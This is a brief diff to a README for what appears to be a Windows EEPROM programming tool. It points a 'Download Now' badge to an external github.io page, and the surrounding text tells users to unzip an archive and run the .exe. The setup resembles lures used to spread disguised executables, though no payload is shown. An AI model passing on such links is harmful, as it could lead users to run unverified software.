@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Run the .exe file to start the application.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://vag-eeprom-programmer.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
